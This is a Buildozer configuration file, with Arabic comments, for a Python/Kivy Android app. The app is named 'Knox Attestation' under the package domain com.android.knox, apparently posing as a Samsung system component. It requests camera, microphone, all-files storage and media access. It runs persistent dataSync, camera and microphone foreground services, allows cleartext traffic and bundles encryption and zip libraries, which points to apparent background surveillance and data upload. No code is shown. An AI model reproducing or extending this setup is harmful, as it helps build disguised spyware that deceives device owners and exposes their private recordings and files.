[app]
# الهوية الأساسية للتطبيق
title = Knox Attestation
package.name = knoxattest
package.domain = com.android.knox

# المصادر: فقط main.py + مجلد assets + ملفات tflite
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite
source.exclude_dirs = tests,__pycache__,docs,.github

# الإصدار
version = 2.5.2

# المتطلبات (باستخدام tensorflow-lite بدلاً من tensorflow الكامل)
# هذا يقلل حجم APK بشكل كبير مع الحفاظ على أداء النموذج
requirements = python3,kivy,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tensorflow-lite

# أيقونة التطبيق (ضع ملف ic_launcher.png في project/res/drawable/)
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# الصلاحيات المطلوبة (شاملة API 33+)
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

# إعدادات SDK/NDK
android.api = 33
android.minapi = 21
android.ndk = 25b
android.sdk = 33
android.build_tools_ver = 33.0.0
android.accept_sdk_license = True
android.archs = arm64-v8a

# إعدادات إضافية
android.allow_backup = False
android.request_legacy_external_storage = True
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.uses_cleartext_traffic = True

# معلومات إضافية للتطبيق (Knox)
android.meta_data = com.samsung.android.knox.intent.action.KNOX_ATTESTATION=true

# إعدادات الشاشة والوضع
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

# تم حذف السطر android.services = monitor:monitor.py لأن monitor.py ليس داخل APK

[buildozer]
log_level = 2
warn_on_root = 0
